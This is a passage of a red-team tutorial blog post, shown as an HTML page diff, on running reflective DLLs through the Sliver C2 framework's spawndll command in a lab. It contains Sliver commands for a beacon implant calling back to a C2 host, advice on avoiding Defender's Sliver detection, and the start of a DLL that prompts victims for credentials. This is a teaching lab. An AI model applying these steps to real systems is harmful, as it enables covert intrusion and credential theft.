@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (11) - SpawnDLL | text/plain</title>
+    <meta name="description" content="Deep-dive into the spwandll command Sliver provides for execution of so-called reflective DLLs.
+I show how to use the command and discuss some implementation details.
+The post mostly covers Sliver itself but also briefly touches upon the reflective loader,
+which is what makes a DLL reflective.
+At the end you can find the usual notes on detection.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, implant, spwandll, reflective DLL loader, DLL, PE">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (11) - SpawnDLL" />
+<meta property="og:description" content="Deep-dive into the spwandll command Sliver provides for execution of so-called reflective DLLs.
+I show how to use the command and discuss some implementation details.
+The post mostly covers Sliver itself but also briefly touches upon the reflective loader,
+which is what makes a DLL reflective.
+At the end you can find the usual notes on detection.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_11_spawndll/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-03-10T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-10T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_11_spawndll/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+input:invalid {
+  border-bottom: 2px solid #f44336 !important;
+}
+
+input:valid {
+  border-bottom: 2px solid #ccc;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/encoders/"><span itemprop="name">Encoders</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (11) - SpawnDLL">
+<meta itemprop="description" content="Deep-dive into the spwandll command Sliver provides for execution of so-called reflective DLLs.
+I show how to use the command and discuss some implementation details.
+The post mostly covers Sliver itself but also briefly touches upon the reflective loader,
+which is what makes a DLL reflective.
+At the end you can find the usual notes on detection.
+"><meta itemprop="datePublished" content="2023-03-10T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-03-10T00:00:00+00:00" />
+<meta itemprop="wordCount" content="3024"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,implant,spwandll,reflective DLL loader,DLL,PE," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (11) - SpawnDLL</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>15 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2023-03-10T00:00:00&#43;00:00">10 Mar, 2023</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Deep-dive into the spwandll command Sliver provides for execution of so-called reflective DLLs.
+I show how to use the command and discuss some implementation details.
+The post mostly covers Sliver itself but also briefly touches upon the reflective loader,
+which is what makes a DLL reflective.
+At the end you can find the usual notes on detection.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a></li>
+    <li><a href="#spawndll">SpawnDLL</a>
+      <ul>
+        <li><a href="#command-usage">Command usage</a></li>
+        <li><a href="#using-existing-tools">Using existing tools</a></li>
+      </ul>
+    </li>
+    <li><a href="#implementation-details">Implementation details</a>
+      <ul>
+        <li><a href="#sliver-source-code">Sliver source code</a></li>
+        <li><a href="#review-of-the-reflective-loader">Review of the reflective loader</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection">Detection</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2 (used here in version v1.5.34).
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/#series-overview">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>With the <code>execute-assembly</code> (<a href="../../post/learning_sliver_c2_09_execute_assembly/">post 9</a>)
+and <code>sideload</code> (<a href="../../post/learning_sliver_c2_10_sideload/">post 10</a>)
+commands we are able to run 3rd part tools written as .NET or native PE executables.
+This post now is about the command <code>spawndll</code>.
+At first glance it looks very similar to <code>sideload</code> since both commands execute Windows DLLs.
+However, <code>spawndll</code> is dedicated to Windows DLLs built in a very specific way.</p>
+<p>The kind of DLL we can run with <code>spawndll</code> is a reflective DLL.
+Many years ago somebody wanted to run a DLL from memory and wrote a
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">reflective loader</a> to do that.
+The problems he had to solve were those we already know from the discussion of Donut in
+<a href="../../post/learning_sliver_c2_10_sideload/#inside-donut">post 10</a>.
+There are relocations to apply, libraries to load, entry points to execute and so on.
+Unlike Donut though, were the loader is &ldquo;wrapped around&rdquo; an ordinary PE file as shellcode,
+the reflective loader is built into the DLL as an exported function.
+A DLL is called reflective if a reflective loader is built into it.</p>
+<p>If the tool you want to use comes as a reflective DLL it will be convenient to run it with <code>spawndll</code>.
+You can also build your own reflective DLL, e.g., by cloning
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">github.com/stephenfewer/ReflectiveDLLInjection</a>
+and adding your code to that project. I will illustrate both things in this post.</p>
+<p>From here onwards expect the following. We will first create our own reflective DLL, based on the code
+used for the DLL in <a href="../../post/learning_sliver_c2_10_sideload/">post 10</a>.
+After that, I&rsquo;ll also demonstrate very briefly how to leverage an existing tool.
+The next section will discuss implementation details.
+I&rsquo;ll keep it short though since the whole thing is so similar to Donut that I would mostly repeat myself.
+At the end there will also be the usual notes on detection.</p>
+<p>First up though, a few notes on the lab so you know what the environment looks like.</p>
+<h2 id="preparations">Preparations</h2>
+<p>My lab environment has the following hosts:</p>
+<ul>
+<li>a target running Windows which we want to infect (192.168.122.61)
+and which also serves as a Windows development machine (Visual Studio installed),</li>
+<li>a Sliver C2 server generating implant shellcode and running stage listeners (192.168.122.111 / sliver.labnet.local)</li>
+<li>a proxy server running Squid and a DNS service to resolve domain names in the lab (192.168.122.185)</li>
+</ul>
+<p>Posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a> to
+<a href="../../post/learning_sliver_c2_05_transports_in_detail_dns/">5</a>
+show how I created it. Details matter only if you want to replicate the setup.</p>
+<p>All you need for this post is a Windows target running a Sliver beacon implant which connects to your C2 server.
+I previous posts I ran Sliver implants with my stager from <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 7</a>
+and injected into Edge. For mysterious reasons this now crashes the browser each time, even without any AV and even though other payloads work fine.
+For now I therefore use the stager from <a href="../../post/learning_sliver_c2_06_stagers_process_injection">post 6</a>,
+which just runs the implant inside of the stager process.</p>
+<p>To prepare, connect to the Sliver console and set up a stage listener.
+Create an implant profile with
+<code>profiles new beacon --http sliver.labnet.local?driver=wininet --seconds 5 --jitter 0 --format shellcode --arch amd64 win64http</code>.
+Even if it takes a bit of time I recommend you do not skip symbol obfuscation, i.e., no <code>--skip-symbols</code>
+(on my Windows the nasty Defender now occasionally detects <code>Behavior:Win32/Sliver.A!sms</code>, a <a href="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/malware-naming?view=o365-worldwide">Microsoft malware name</a> for something that behaves like Sliver, which for now can be avoided by obfuscation and changing a few defaults here and there).
+Then start the listener:</p>
+<pre tabindex="0"><code>sliver &gt; stage-listener --url http://sliver.labnet.local:80 --profile win64http
+
+[*] No builds found for profile win64http, generating a new one
+[*] Job 1 (http) started
+
+sliver &gt;  jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    http   tcp        80
+</code></pre><p>Now run your stager or get the implant running in any other way.</p>
+<h2 id="spawndll">SpawnDLL</h2>
+<h3 id="command-usage">Command usage</h3>
+<p>As usual: if you want to run something you have to build it first.
+To make a reflective DLL I found it most convenient to clone the repository
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">github.com/stephenfewer/ReflectiveDLLInjection</a>
+and use it as a template.</p>
+<p>Once the repository is on your disk, open it with Visual Studio by double-clicking <code>rdi.sln</code>.
+Visual Studio may ask if you want to retarget the project since it was build for an older version.
+I said yes and it was not a problem.</p>
+<p>However, before making any changes to the project make sure everything works.
+You should be able to build the project and get a release DLL as output.
+Copy it over to your C2 server, use your beacon or session and execute the DLL with:</p>
+<pre tabindex="0"><code>sliver (PEACEFUL_EX-WIFE) &gt; spawndll /tmp/reflective_dll.x64.dll
+
+[*] Tasked beacon PEACEFUL_EX-WIFE (1dccfa64)
+
+[+] PEACEFUL_EX-WIFE completed task 1dccfa64
+
+[*] Output:
+</code></pre><p>If it worked, you should see the following message box popping up on the Windows target:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/37_sliver_c2_spawndll/reflective_dll_executed.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The sample reflective DLL was executed</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Its time to put our own code in.
+The idea of reflective loading is as follows.
+Your Sliver implant is supposed to put the DLL somewhere into memory and execute
+a specific exported function, called
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c#L51">ReflectiveLoader</a> by default.
+It is carefully designed to not crash even though the DLL was not properly loaded,
+will do all the loading work and when it is done, it will call <code>DllMain</code> with the <code>DLL_PROCESS_ATTACH</code> argument.
+This is where you should put your custom code.</p>
+<p>Our sample DLL should do the same it did in the post about <code>sideload</code>: ask the user for credentials.
+Take the function <code>askForCreds</code> from the
+<a href="../../post/learning_sliver_c2_10_sideload/#basic-usage-demonstration">previous post</a>,
+copy it into the new reflective loader project and integrate into <code>DllMain</code> as shown in the following code snippet.
+The file <a href="https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveDll.c">ReflectiveDll.c</a> should look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;commctrl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wincred.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment(lib, &#34;comctl32.lib&#34;)
